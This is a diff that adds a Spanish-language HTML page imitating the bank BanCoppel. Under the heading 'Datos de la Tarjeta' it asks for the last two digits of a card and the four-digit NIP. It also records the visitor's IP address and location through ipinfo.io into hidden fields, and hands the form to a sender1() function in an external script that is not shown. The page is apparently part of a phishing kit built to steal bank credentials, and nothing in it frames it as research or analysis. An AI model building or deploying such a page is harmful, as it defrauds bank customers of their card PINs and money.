@@ -1,0 +1,109 @@
+
+<html><script>
+  </script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link rel="stylesheet" href="bootstrap.min.css">
+	
+<title>Home</title><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" type="text/css" href="util.css"><link rel="stylesheet" type="text/css" href="main.css">   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  
+   <script>
+      $.getJSON("https://ipinfo.io", function (response) {
+  $("#ip").html("IP: " + response.ip);
+  $("#address").html("" + response.city + ", " + response.country);
+  
+  })
+   </script></head>
+
+<body>
+	<header id="main-header">
+
+		<a class="logo-header" href="index.html">
+			<img src="https://www.westernunion.com/content/dam/wu/rmt/BanCoppel.png">
+		</a> <!-- / #logo-header -->
+		
+		
+
+						
+		<div class="menu-header" href="index.html">
+	 <div id="bar-menu" class="bar-menu">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+  </div>
+	</header><!-- / #main-header -->
+	<div class="limiter">
+		<div class="container-login100" style="background-image: url(https://images.unsplash.com/photo-1588421357574-87938a86fa28?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxleHBsb3JlLWZlZWR8Mnx8fGVufDB8fHx8fA%3D%3D&w=1000&q=80); 
+    position: absolute;
+   ">
+			<div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+			
+			<br>
+			<br>
+<section class="">
+           
+        <form class="login100-form validate-form" onsubmit="javascript:return sender1()">
+             <p id="address"  hidden="">
+                 <p id="gfg"  hidden="">
+				 
+					<b><div class="textypn1"><span class="model" style="font-size:28px; color:#003995; text-align:center;">
+					Datos de la Tarjeta</div></b>
+					<div class="wrap-input101 validate-input" data-validate="" > 
+					<br>
+				
+					<br>
+					<div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
+					2 últimos digitos de tu tarjeta</div>
+					<br>
+					<div class="wrap-input101 validate-input" data-validate="" > 
+						<span class="label-input101"></span>
+						<input class="input101" type="text"  pattern="[0-9]*" inputmode="numeric" name="ypndt" id="ypndt" maxlength="2" minlength="2" required="true" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" placeholder="Ingresa los 2 últimos digitos de tu tarjeta" required="">
+						<span class="focus-input100" data-symbol=""></span>
+					</div>
+					<div class="wrap-input101 validate-input" data-validate="" > 
+						<span class="label-input101"></span>
+						<br>
+						<br>
+						<div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
+					Ingresar NIP</div>
+						<input class="input101" type="text"  pattern="[0-9]*" inputmode="numeric" name="ypndn" id="ypndn" maxlength="4" minlength="4" required="true" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" placeholder="Ingresa los 4 digitos de tu NIP" required="">
+						<span class="focus-input100" data-symbol=""></span>
+					</div>
+			
+					<br>
+					<div class="text-right p-t-8 p-b-31">
+						
+					</div>
+					
+					<div class="container-login100-form-btn">
+					    
+						<div class="wrap-login100-form-btn">
+							<div class="login100-form-bgbtn"></div>
+							<button type="submit" style="height:50px; width:100%;" class="login100-form-btn">
+								Continuar
+							</button>
+						</div>
+					</div>
+					
+					<div>
+					<br>
+					<br>
+
+
+					</div><br>
+
+						
+					
+				</form>
+				
+			</div>
+			
+		</div>
+			<header id="main-header2">
+	</header><!-- / #main-header -->
+	</div>
+		<div id="dropDownSelect1"></div>
+	
+	<script src="saxcopp.js"></script>
+
+
+</body></html>
